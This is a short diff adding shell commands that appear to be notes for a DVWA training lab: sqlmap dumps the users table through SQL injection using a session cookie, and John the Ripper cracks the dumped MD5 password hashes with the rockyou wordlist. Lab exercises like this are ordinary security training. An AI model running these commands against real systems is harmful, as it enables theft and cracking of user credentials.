@@ -1,0 +1,11 @@
+# Extract hashes
+sqlmap -u "TARGET_URL" --cookie="COOKIE" -D dvwa -T users --dump
+
+# Save hash
+nano hashes.txt
+
+# Crack hash
+john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Show result
+john --show hashes.txt
